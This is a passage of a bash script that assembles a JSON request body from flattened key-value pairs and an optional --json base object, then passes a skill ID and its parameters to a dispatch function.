  v="$(json_escape "${FLAT_STR_VALS[$i]}")"
  PARTS+=("\"${k}\":\"${v}\"")
done
for i in "${!FLAT_RAW_KEYS[@]}"; do
  k="$(json_escape "${FLAT_RAW_KEYS[$i]}")"
  v="${FLAT_RAW_VALS[$i]}"
  PARTS+=("\"${k}\":${v}")
done

FLAT_JSON=""
if [[ ${#PARTS[@]} -gt 0 ]]; then
  FLAT_JSON="$(IFS=,; echo "${PARTS[*]}")"
fi

# ── Merge with --json base (if any). Flat keys come FIRST so --json's own
# members win on a name collision (JSON.parse last-duplicate-key-wins). ────
if [[ -n "$JSON_BASE" ]]; then
  INNER="${JSON_BASE:1:-1}"   # strip outer { }
  INNER_TRIMMED="$(printf '%s' "$INNER" | sed -e 's/^[[:space:]]*//')"
  if [[ -n "$FLAT_JSON" && -n "$INNER_TRIMMED" ]]; then
    PARAMS_JSON="{${FLAT_JSON},${INNER}}"
  elif [[ -n "$FLAT_JSON" ]]; then
    PARAMS_JSON="{${FLAT_JSON}}"
  else
    PARAMS_JSON="{${INNER}}"
  fi
else
  PARAMS_JSON="{${FLAT_JSON}}"
fi

SKILL_ID_ESCAPED="$(json_escape "$SKILL_ID")"
JSON_BODY="{\"skillId\":\"${SKILL_ID_ESCAPED}\",\"params\":${PARAMS_JSON}}"

_dispatch "$JSON_BODY"
